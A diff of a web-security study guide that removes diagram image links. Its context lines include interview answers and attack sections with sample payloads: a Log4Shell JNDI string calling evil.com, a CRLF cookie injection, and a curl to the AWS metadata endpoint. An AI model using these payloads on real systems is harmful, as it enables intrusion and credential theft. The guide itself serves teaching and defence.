-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-handwritten.svg" alt="Handwritten: What is IDOR and how is it different from broken access control?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-diagram.svg" alt="Diagram: What is IDOR and how is it different from broken access control?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-idor-and-how-is-it-different-from-broken-access-control-sticky.svg" alt="Sticky Note: What is IDOR and how is it different from broken access control?" width="30%">
-</a>
-
 
 **Answer:** IDOR (Insecure Direct Object Reference) is a type of broken access control where an application exposes internal object references (database IDs, file paths) and fails to verify if the user should access that object. Example: changing `GET /api/invoice/123` to `/api/invoice/456` and viewing another user's invoice. Prevention: use indirect references (UUIDs) and always verify ownership server-side.
 ### Q17: Explain DOM Clobbering.
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-handwritten.svg" alt="Handwritten: Explain DOM Clobbering." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-diagram.svg" alt="Diagram: Explain DOM Clobbering." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-dom-clobbering-sticky.svg" alt="Sticky Note: Explain DOM Clobbering." width="30%">
-</a>
 
 
 **Answer:** DOM Clobbering is an attack where HTML elements with `id` or `name` attributes override JavaScript variables. For example, `<a id="config">` overrides `window.config`. If the application then checks `if (config.isAdmin)`, the attacker can control the result by setting `href` attribute. Prevention: use `typeof` checks, avoid trusting DOM properties for security decisions.
 ### Q18: What is the difference between XSS and CSRF?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-handwritten.svg" alt="Handwritten: What is the difference between XSS and CSRF?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-diagram.svg" alt="Diagram: What is the difference between XSS and CSRF?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-difference-between-xss-and-csrf-sticky.svg" alt="Sticky Note: What is the difference between XSS and CSRF?" width="30%">
-</a>
-
 
 **Answer:** XSS executes attacker-controlled JavaScript in the victim's browser (trust is violated). CSRF tricks the browser into sending authenticated requests to a target site (identity is abused). XSS can bypass CSRF protections (because the script reads the token). CSRF does not require JavaScript at all (image tag, form submission).
 ### Q19: What are security headers and which are most important?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-handwritten.svg" alt="Handwritten: What are security headers and which are most important?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-diagram.svg" alt="Diagram: What are security headers and which are most important?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-security-headers-and-which-are-most-important-sticky.svg" alt="Sticky Note: What are security headers and which are most important?" width="30%">
-</a>
 
 
 **Answer:** HTTP response headers that instruct browsers how to behave regarding security. The most important: (1) Content-Security-Policy - prevents XSS and data injection; (2) Strict-Transport-Security - enforces HTTPS; (3) X-Frame-Options - prevents clickjacking; (4) X-Content-Type-Options - prevents MIME sniffing; (5) Set-Cookie with HttpOnly, Secure, SameSite - protects session cookies.
 ### Q20: What is CRLF injection?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-handwritten.svg" alt="Handwritten: What is CRLF injection?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-diagram.svg" alt="Diagram: What is CRLF injection?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-crlf-injection-sticky.svg" alt="Sticky Note: What is CRLF injection?" width="30%">
-</a>
-
 
 **Answer:** CRLF injection occurs when an attacker injects carriage return (`\r`) and line feed (`\n`) characters into HTTP headers or responses. This can split the response, allowing HTTP response splitting, header injection, or XSS. Example: injecting `%0d%0aSet-Cookie:%20session=stealed` into a redirect URL. Prevention: strip or encode `\r\n` from all user input used in headers.
 ### Q21: How does CSP with strict-dynamic work?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-handwritten.svg" alt="Handwritten: How does CSP with strict-dynamic work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-diagram.svg" alt="Diagram: How does CSP with strict-dynamic work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/how-does-csp-with-strict-dynamic-work-sticky.svg" alt="Sticky Note: How does CSP with strict-dynamic work?" width="30%">
-</a>
 
 
 **Answer:** `strict-dynamic` allows scripts loaded by trusted scripts to also execute, propagating trust through the script graph. This eliminates the need to list every CDN in the CSP. If script A (loaded with the correct nonce) creates script B via `document.createElement('script')`, script B is also trusted. `strict-dynamic` also ignores `https:` scheme allowlists and most hosts in `script-src`.
 ### Q22: What is the Same Origin Policy?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-handwritten.svg" alt="Handwritten: What is the Same Origin Policy?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-diagram.svg" alt="Diagram: What is the Same Origin Policy?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-the-same-origin-policy-sticky.svg" alt="Sticky Note: What is the Same Origin Policy?" width="30%">
-</a>
-
 
 **Answer:** Same-Origin Policy (SOP) is a browser security mechanism that restricts how scripts on one origin can interact with resources from another origin. Two URLs have the same origin if they share the same protocol, host, and port. SOP prevents a malicious site from reading data from another site without explicit permission (CORS, postMessage, etc.).
 ### Q23: Explain CORS and common misconfigurations.
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-handwritten.svg" alt="Handwritten: Explain CORS and common misconfigurations." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-diagram.svg" alt="Diagram: Explain CORS and common misconfigurations." width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/explain-cors-and-common-misconfigurations-sticky.svg" alt="Sticky Note: Explain CORS and common misconfigurations." width="30%">
-</a>
 
 
 **Answer:** CORS (Cross-Origin Resource Sharing) relaxes SOP using HTTP headers. Common misconfigurations: (1) `Access-Control-Allow-Origin: *` with credentials - allows any site to read authenticated responses; (2) Reflecting origin from `Origin` header - attacker sets Origin to evil.com; (3) Null origin allowed - sandboxed iframes can bypass. Secure config: `Access-Control-Allow-Origin: https://trusted.com` with `Vary: Origin`.
 ### Q24: What is Cache Poisoning and how does it work?
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-handwritten.svg" alt="Handwritten: What is Cache Poisoning and how does it work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-diagram.svg" alt="Diagram: What is Cache Poisoning and how does it work?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-is-cache-poisoning-and-how-does-it-work-sticky.svg" alt="Sticky Note: What is Cache Poisoning and how does it work?" width="30%">
-</a>
-
 
 **Answer:** Web cache poisoning tricks a caching proxy into storing a malicious response and serving it to other users. An attacker finds an unkeyed input (like `X-Forwarded-Host` header) that the backend uses to generate URLs. By sending a request with a malicious host header, the cache stores the poisoned response. All subsequent users receive the malicious version until it expires.
 ### Q25: What are common 2FA bypass techniques?
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-handwritten.svg" alt="Handwritten: What are common 2FA bypass techniques?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-diagram.svg" alt="Diagram: What are common 2FA bypass techniques?" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/what-are-common-2fa-bypass-techniques-sticky.svg" alt="Sticky Note: What are common 2FA bypass techniques?" width="30%">
-</a>
 
 
 **Answer:** (1) Bypassing via OAuth - some apps only require 2FA on the primary login but not on social login; (2) Session reuse - if 2FA is checked once per session, in-progress sessions may bypass subsequent checks; (3) Backup code brute force - if backup codes have low entropy; (4) Response manipulation - modifying the 2FA validation response from false to true; (5) Race condition - submitting 2FA code and cancelling simultaneously.
@@ -3650,16 +2449,6 @@ MITRE ATT&CK:          https://attack.mitre.org/
 ## 33. Expanded Case Studies: SolarWinds & Log4Shell
 
 ### Case Study 5: SolarWinds 2020 - Supply Chain Attack
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-handwritten.svg" alt="Handwritten: Case Study 5: SolarWinds 2020 - Supply Chain Attack" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-diagram.svg" alt="Diagram: Case Study 5: SolarWinds 2020 - Supply Chain Attack" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-5-solarwinds-2020-supply-chain-attack-sticky.svg" alt="Sticky Note: Case Study 5: SolarWinds 2020 - Supply Chain Attack" width="30%">
-</a>
 
 
 **Attack Type:** Malicious code injection into Orion software updates
@@ -3679,16 +2468,6 @@ MITRE ATT&CK:          https://attack.mitre.org/
 - Monitor DNS queries for anomalous patterns
 - Implement build pipeline security (code signing, integrity checks)
 ### Case Study 6: Log4Shell 2021 - CVE-2021-44228
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-handwritten.svg" alt="Handwritten: Case Study 6: Log4Shell 2021 - CVE-2021-44228" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-diagram.svg" alt="Diagram: Case Study 6: Log4Shell 2021 - CVE-2021-44228" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/case-study-6-log4shell-2021-cve-2021-44228-sticky.svg" alt="Sticky Note: Case Study 6: Log4Shell 2021 - CVE-2021-44228" width="30%">
-</a>
 
 
 **Attack Type:** JNDI injection via log message
@@ -3723,16 +2502,6 @@ X-Forwarded-For: ${jndi:ldap://evil.com/exploit}
 
 ### Security Gates
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-handwritten.svg" alt="Handwritten: Security Gates" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-diagram.svg" alt="Diagram: Security Gates" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-gates-sticky.svg" alt="Sticky Note: Security Gates" width="30%">
-</a>
-
 
 
 ```text
@@ -3749,16 +2518,6 @@ Incident        IR Plan             Playbooks, runbooks, tabletop exercises
 ```
 
 ### Security Requirements Checklist
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-handwritten.svg" alt="Handwritten: Security Requirements Checklist" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-diagram.svg" alt="Diagram: Security Requirements Checklist" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/security-requirements-checklist-sticky.svg" alt="Sticky Note: Security Requirements Checklist" width="30%">
-</a>
 
 
 
@@ -3796,16 +2555,6 @@ Incident        IR Plan             Playbooks, runbooks, tabletop exercises
 
 ### PASTA Threat Model (Process for Attack Simulation and Threat Analysis)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-handwritten.svg" alt="Handwritten: PASTA Threat Model (Process for Attack Simulation and Threat Analysis)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-diagram.svg" alt="Diagram: PASTA Threat Model (Process for Attack Simulation and Threat Analysis)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/pasta-threat-model-process-for-attack-simulation-and-threat-analysis-sticky.svg" alt="Sticky Note: PASTA Threat Model (Process for Attack Simulation and Threat Analysis)" width="30%">
-</a>
-
 
 
 ```text
@@ -3841,16 +2590,6 @@ Stage 7: Risk and impact analysis
 
 ### OWASP ASVS Levels
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-handwritten.svg" alt="Handwritten: OWASP ASVS Levels" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-diagram.svg" alt="Diagram: OWASP ASVS Levels" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-asvs-levels-sticky.svg" alt="Sticky Note: OWASP ASVS Levels" width="30%">
-</a>
-
 
 
 ```text
@@ -3870,16 +2609,6 @@ Level 3: High-value / critical applications
 
 ### 25.1 HTTP Parameter Pollution (HPP)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-handwritten.svg" alt="Handwritten: 25.1 HTTP Parameter Pollution (HPP)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-diagram.svg" alt="Diagram: 25.1 HTTP Parameter Pollution (HPP)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-1-http-parameter-pollution-hpp-sticky.svg" alt="Sticky Note: 25.1 HTTP Parameter Pollution (HPP)" width="30%">
-</a>
-
 
 When an application receives multiple HTTP parameters with the same name, different technologies handle the collision differently.
 
@@ -3895,16 +2624,6 @@ Attack scenario:
 ```
 
 ### 25.2 HTTP Verb Tampering
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-handwritten.svg" alt="Handwritten: 25.2 HTTP Verb Tampering" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-diagram.svg" alt="Diagram: 25.2 HTTP Verb Tampering" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-2-http-verb-tampering-sticky.svg" alt="Sticky Note: 25.2 HTTP Verb Tampering" width="30%">
-</a>
 
 
 Testing alternative HTTP methods can bypass access controls.
@@ -3924,16 +2643,6 @@ curl -X HEAD http://target.com/admin/panel
 
 ### 25.3 Response Splitting / Header Injection
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-handwritten.svg" alt="Handwritten: 25.3 Response Splitting / Header Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-diagram.svg" alt="Diagram: 25.3 Response Splitting / Header Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-3-response-splitting-header-injection-sticky.svg" alt="Sticky Note: 25.3 Response Splitting / Header Injection" width="30%">
-</a>
-
 
 
 ```http
@@ -3945,16 +2654,6 @@ Host: target.com
 ```
 
 ### 25.4 Method Override Bypass
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-handwritten.svg" alt="Handwritten: 25.4 Method Override Bypass" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-diagram.svg" alt="Diagram: 25.4 Method Override Bypass" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-4-method-override-bypass-sticky.svg" alt="Sticky Note: 25.4 Method Override Bypass" width="30%">
-</a>
 
 
 Some frameworks support header-based method override:
@@ -3968,16 +2667,6 @@ Content-Length: 0
 ```
 
 ### 25.5 Mass Assignment
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-handwritten.svg" alt="Handwritten: 25.5 Mass Assignment" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-diagram.svg" alt="Diagram: 25.5 Mass Assignment" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-5-mass-assignment-sticky.svg" alt="Sticky Note: 25.5 Mass Assignment" width="30%">
-</a>
 
 
 
@@ -3996,16 +2685,6 @@ POST /api/user/register
 
 ### 25.6 Race Condition in File Upload
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-handwritten.svg" alt="Handwritten: 25.6 Race Condition in File Upload" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-diagram.svg" alt="Diagram: 25.6 Race Condition in File Upload" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-6-race-condition-in-file-upload-sticky.svg" alt="Sticky Note: 25.6 Race Condition in File Upload" width="30%">
-</a>
-
 
 
 ```bash
@@ -4022,16 +2701,6 @@ wait
 
 ### 25.7 ReDoS (Regular Expression Denial of Service)
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-handwritten.svg" alt="Handwritten: 25.7 ReDoS (Regular Expression Denial of Service)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-diagram.svg" alt="Diagram: 25.7 ReDoS (Regular Expression Denial of Service)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-7-redos-regular-expression-denial-of-service-sticky.svg" alt="Sticky Note: 25.7 ReDoS (Regular Expression Denial of Service)" width="30%">
-</a>
-
 
 
 ```javascript
@@ -4044,16 +2713,6 @@ const evil = "a".repeat(30) + "!";
 ```
 
 ### 25.8 Server Side Includes (SSI)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-handwritten.svg" alt="Handwritten: 25.8 Server Side Includes (SSI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-diagram.svg" alt="Diagram: 25.8 Server Side Includes (SSI)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/25-8-server-side-includes-ssi-sticky.svg" alt="Sticky Note: 25.8 Server Side Includes (SSI)" width="30%">
-</a>
 
 
 
@@ -4069,16 +2728,6 @@ const evil = "a".repeat(30) + "!";
 ## 38. Cloud-Specific Web Attacks
 
 ### 26.1 AWS-Specific SSRF
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-handwritten.svg" alt="Handwritten: 26.1 AWS-Specific SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-diagram.svg" alt="Diagram: 26.1 AWS-Specific SSRF" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-1-aws-specific-ssrf-sticky.svg" alt="Sticky Note: 26.1 AWS-Specific SSRF" width="30%">
-</a>
 
 
 
@@ -4097,16 +2746,6 @@ curl http://169.254.169.254/latest/user-data/
 
 ### 26.2 IMDSv2 Protection
 
